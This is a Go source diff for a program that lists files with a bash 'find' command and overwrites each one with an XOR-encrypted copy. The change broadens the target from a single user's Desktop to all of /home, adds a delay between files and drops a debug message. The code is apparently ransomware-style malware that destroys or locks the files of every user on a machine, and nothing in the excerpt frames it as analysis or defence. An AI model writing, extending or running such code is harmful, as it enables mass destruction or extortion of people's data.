@@ -7,6 +7,7 @@ import (
 	"os/exec"
 	"strings"
 	"sync"
+	"time"
 )
 
 var wg sync.WaitGroup
@@ -38,13 +39,13 @@ func Crypt(filename string, ch chan string) {
 	arr = nil
 	_ = ioutil.WriteFile(filename, xor, 0644)
 	xor = nil
+	time.Sleep(time.Millisecond * 120)
 	wgc.Done()
-	fmt.Println("fini")
 	Crypt(<-ch, ch)
 }
 
 func main() {
-	cmd := exec.Command("bash", "-c", "find /home/tomfox/Desktop -type f")
+	cmd := exec.Command("bash", "-c", "find /home -type f")
 	output, _ := cmd.CombinedOutput()
 	listfile := strings.Split(string(output), "\n")
 	ch := make(chan string, len(listfile))
